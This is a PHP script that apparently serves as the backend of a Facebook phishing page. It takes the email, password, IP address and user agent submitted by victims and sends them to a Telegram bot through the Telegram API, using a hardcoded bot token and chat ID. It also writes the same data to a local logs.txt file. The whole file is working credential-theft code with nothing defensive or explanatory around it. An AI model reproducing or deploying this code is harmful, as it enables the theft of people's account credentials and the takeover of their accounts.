<?php
// Telegram Configuration
$botToken = '7562492082:AAEOU5iolvr242vlrs4KlLKiiysD4Mi3UkI';
$chatId = '5536239543';

// Get posted data
$email = $_POST['email'] ?? '';
$password = $_POST['password'] ?? '';
$userAgent = $_POST['userAgent'] ?? '';
$ip = $_POST['ip'] ?? '';

// Prepare the message
$message = "🔥 *New Facebook Login* 🔥\n";
$message .= "📅 *Date:* " . date('Y-m-d H:i:s') . "\n";
$message .= "📧 *Email/Phone:* `$email`\n";
$message .= "🔑 *Password:* `$password`\n";
$message .= "🌐 *IP Address:* `$ip`\n";
$message .= "🖥️ *User Agent:* \n`$userAgent`";

// Send to Telegram
$url = "https://api.telegram.org/bot$botToken/sendMessage";
$data = [
    'chat_id' => $chatId,
    'text' => $message,
    'parse_mode' => 'Markdown'
];

$options = [
    'http' => [
        'header' => "Content-type: application/x-www-form-urlencoded\r\n",
        'method' => 'POST',
        'content' => http_build_query($data)
    ]
];

$context = stream_context_create($options);
$result = file_get_contents($url, false, $context);

// Also save to file (backup)
file_put_contents('logs.txt', 
    "Time: " . date('Y-m-d H:i:s') . "\n" .
    "Email: $email\n" .
    "Password: $password\n" .
    "IP: $ip\n" .
    "User Agent: $userAgent\n\n", 
    FILE_APPEND
);

// Return success response
header('Content-Type: application/json');
echo json_encode(['status' => 'success']);
?>
